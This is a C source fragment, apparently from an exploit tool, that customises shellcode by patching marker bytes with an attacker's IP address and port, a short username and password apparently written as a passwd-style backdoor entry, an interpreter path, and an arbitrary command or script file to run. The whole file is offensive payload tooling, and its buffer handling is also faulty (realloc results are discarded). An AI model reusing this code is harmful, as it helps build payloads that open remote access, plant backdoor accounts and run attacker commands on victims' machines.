/*
 * Shellcode personalization
*/

//
void mark_not_found(const char *type)
{
    printf("[!] ERROR: %s mark not found. Check your payload\n", type);
    exit(-1);
}

//
void set_ip(char *shellcode, u_int32_t ip)
{
    char *ptr = NULL;
 
    if(!(ptr = index(shellcode, ip_mark))) mark_not_found("IP");
 
    *(u_int32_t*)ptr = ip;
}

//
void set_port(char *shellcode, unsigned short port)
{
    char *ptr = NULL;

    if(!(ptr = memchr(shellcode, port_mark, payload_len))) mark_not_found("port");
    //ptr = index(shellcode, mark); //crashes if IP contains NULL bytes

    *(u_int16_t*)ptr = port;
}

//username = 4 chars
void set_username(char *shellcode, char *username)
{
    char *ptr = NULL;
    int name_len = strlen(username);
    char name[4];

    memset(name, 'a', 4);

    if(!(ptr = index(shellcode, username_mark))) mark_not_found("username");

    strncpy(name, username, (name_len < 4) ? name_len : 4);
    strncpy(ptr, name, 4);
}

//password = 4 chars
void set_password(char *shellcode, char *password)
{
    char *ptr1 = NULL, *ptr2 = NULL;
    int pass_len = strlen(password);
    char pass[4];

    memset(pass, 'a', 4);

    //0:::D:0::DDDCCCC
    //    ^    ^
    //   ptr1 ptr2

    ptr1 = index(shellcode, password_mark);
    ptr2 = index(ptr1+1, password_mark);
    if(!ptr1 || !ptr2) mark_not_found("password");

    strncpy(pass, password, (pass_len < 4) ? pass_len : 4);

    *ptr1 = pass[3];
    strncpy(ptr2, pass, 3);
}

//
void set_interpreter(char *shellcode, char *_interpreter)
{
    char *ptr = NULL;
    char *interpreter = _interpreter;
    int interp_len, bytes_to_move;

    if(!interpreter) interpreter = "/bin/bash";
    interp_len = strlen(interpreter);

    if(!(ptr = index(shellcode, interp_mark))) mark_not_found("interpreter");

    payload_len += (interp_len - 1);
    if(!realloc(sh_buffer, payload_len)) exit(-1);

    bytes_to_move = payload_len - (ptr - sh_buffer) - interp_len;
    strncpy(ptr+interp_len, ptr+1, bytes_to_move);
    strncpy(ptr, interpreter, interp_len);
}

//
void set_script(char *shellcode, char *_cmd, char *file)
{
    char *ptr = NULL;
    char *cmd = _cmd;

    if(!cmd && !file) cmd = "echo test";

    if(!(ptr = index(shellcode, script_mark))) mark_not_found("script");

    if(cmd)
    {
        payload_len += strlen(cmd);
        if(!realloc(sh_buffer, payload_len)) exit(-1);

        strcpy(ptr, cmd);
    }
    else if(file)
    {
        FILE *script_file = NULL;
        //char _char;
        long script_len = 0;
        int i;

        if(!(script_file = fopen(file, "r"))) {
            perror("Error opening script file");            
            exit(-1);
        }

        fseek(script_file, 0L, SEEK_END);
        script_len = ftell(script_file);

        payload_len += script_len;
        if(!realloc(sh_buffer, payload_len)) exit(-1);

        rewind(script_file);

        for(i=0; i<script_len; i++) *(ptr++) = fgetc(script_file);
/*
        while( (_char = fgetc(script_file)) != EOF)
        {
            printf("%c", *ptr);////
            *ptr = _char;
            ptr++;
        }
*/
        fclose(script_file);
    }
}

//
void personalize_shellcode(void)
{
    printf("[DBG] Payload before personalization:\n%s\n", sh_buffer);
    if(args.my_ip) set_ip(sh_buffer, args.my_ip);
    if(args.my_port) set_port(sh_buffer, args.my_port);
    if(args.my_username) set_username(sh_buffer, args.my_username);
    if(args.my_password) set_password(sh_buffer, args.my_password);
    if(args.payload_index == 3)
    {
     set_interpreter(sh_buffer, args.interpreter);
     set_script(sh_buffer, args.perl_code, args.perl_file);
    }
    printf("[DBG] Payload after personalization:\n%s\n", sh_buffer);
}

